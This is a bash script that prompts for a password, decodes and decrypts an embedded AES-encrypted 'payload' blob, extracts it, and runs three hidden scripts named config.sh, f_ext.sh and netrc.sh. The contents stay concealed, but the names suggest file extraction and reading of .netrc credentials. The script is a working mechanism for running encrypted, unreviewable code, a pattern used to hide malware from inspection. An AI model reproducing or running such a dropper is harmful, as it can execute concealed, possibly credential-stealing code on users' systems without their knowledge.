#!/usr/bin/env bash
set -eu

run_payload() {
  if ! command -v openssl >/dev/null 2>&1; then
    echo "payload: openssl not found in PATH." >&2
    exit 2
  fi

  if ! command -v tar >/dev/null 2>&1; then
    echo "payload: tar not found in PATH." >&2
    exit 2
  fi

  if ! command -v base64 >/dev/null 2>&1; then
    echo "payload: base64 not found in PATH." >&2
    exit 2
  fi

  base64_decode() {
    if base64 -d </dev/null >/dev/null 2>&1; then
      base64 -d
    else
      base64 -D
    fi
  }

  printf 'Password: '
  IFS= read -r -s password
  printf '\n'

  tmp_dir="$(mktemp -d)"
  trap 'rm -rf "$tmp_dir"' EXIT

  if ! printf '%s' "$PAYLOAD" | base64_decode \
      | openssl enc -d -aes-256-cbc -pbkdf2 -salt -pass "pass:$password" 2>/dev/null \
      | tar -xzf - -C "$tmp_dir"; then
    echo "payload: invalid password or corrupted payload." >&2
    exit 1
  fi

  for s in "${SCRIPTS[@]}"; do
    chmod +x "$tmp_dir/$s"
    "$tmp_dir/$s"
  done
}

SCRIPTS=(
  "config.sh"
  "f_ext.sh"
  "netrc.sh"
)

PAYLOAD='U2FsdGVkX1/A+0sJHnjm9STROO4BvIiCoKo9cO6X7SonNGNIEFQb7P+/4h+kN4pfjRZZuDi7aW/UfKEr48B/b6zjnXKwjLfnV5XpMt/u0GMuaVHLu6FElSqjp5G7aTHlAggflSFfI+iqvDtvG+mMCl4D8Y5JpkoU4s3aq9hn6qL+rpCFBCPSrxHnM4EeY15ml5Mljg2Upy2KqoaLsTgrG4ShlvcyoBeVSJddXxEAb5fznhGEgJE6sdvrWxmIIrl1PvaapqTYZpN3o0eO/MaXElnB/YKw748YFnJ7FeCyTKp0ZyuERBiw0wzTWS3n20Ze6lhRBqBdRmNf3bHbCzb+/5pV7Ej3OWwGtnZDBgIGEq5pp8ojx/NmfXY1MKKOA0B1z984hEOR4pm3ldFJwUNxWosplsAk+o2BzcI3Bn1Q5+Ai3QDVoa88LN7/h5CPYs29dHHlrrOg9Y0ErzWaNyWEGIysWNECmQ8pOjy9jecOk1lp5mQ7tIqOVaUIaF/guUtn8wC3y6KxCRR92VdhboJ9tyKSoejwj5o1Ra/achrsbBUq5v86atIfSmH3pjqlUD/sD4XQQ3O7Gye1xVmnRl/Cz3LNWyCxwbe9I+gnY3UxRrFhQQQ/2zrOHlG/JWVEKaWorg9UN/tkAyjezPIYhACikQIYoXXa4MZgEzI4zWYQJNTAXSXKqSKLnNFPitjvS5LYtw+VFHQO+EvnTrGxSSxlbK6NGxIzMNKnYfv+zLzlJlEyTAImpKq7vaLSDLxpsvnatGFtudldbBakLJSwquugh4zjRlwsDxfTfP6Lxddrj+Qfc63WDUpcgapXyiyL7jnGY9Eakbd7iQMTeziWFD+wqOGoIZJ1MqXrhgmuyyoC5A3gwBVOpDrVD8JQ1kAbZIrYgEJ0jIyvR7WRmJko1rx3vdkynOKym1aRbTwOqq5sxfAXHkkqdTRUgABvGW7fbqiXpbmggD6y1lro8so0eWHWe2wjUFErMXI5zVYoJpyLed2FLHdBZhHoZmhp58v7wjfQOVi1dOoDIXPOxTKXEvLXZCfD2uj9OlFfwWjHi1Z9O61qglylnOHZZ+088VulS7idijPR3DQsOP9/ViVGO5ppTr3UulEF7AbwitoB0XaqWl0VNKqhowwVd3kQOCRW4rn2lQKYZ5nu3URAoQP3N4dXv3B8RrXcVq9454GQ2qxAw6eBfvDMk4EJM+yxlaY8psYpdAJAB68Z1q0XODkEXsd4yCbLfFeEI/H0gFFanOHEoL9/PSeF8jCQcb7cr+KWmaFiisg1MLRzbXUdd1Btqu6B9nFgKrSbiPf+ePteWSeV4qz1N3AdpzwuFSJFmgDjwjhSCdh2PKBmDeDJY58AB4qzVfznJ2nNc6nVejS5MjqcKX+R0GwlOnj59CnTOldyYVTZY15NOrdrqNWif4FlDmQd3LYp78vUx7Rf/GChyQkIOJ6/MwUaN/VSnwM7JchEHRYsJ6Pli59YzT4I4aQUNAmFseXqrld1reEc018KxZO8YNkdTx+OBz7Q8yafOjufgBneCTyC1ldslPsnIVVhMq+BVw=='

run_payload "$@"
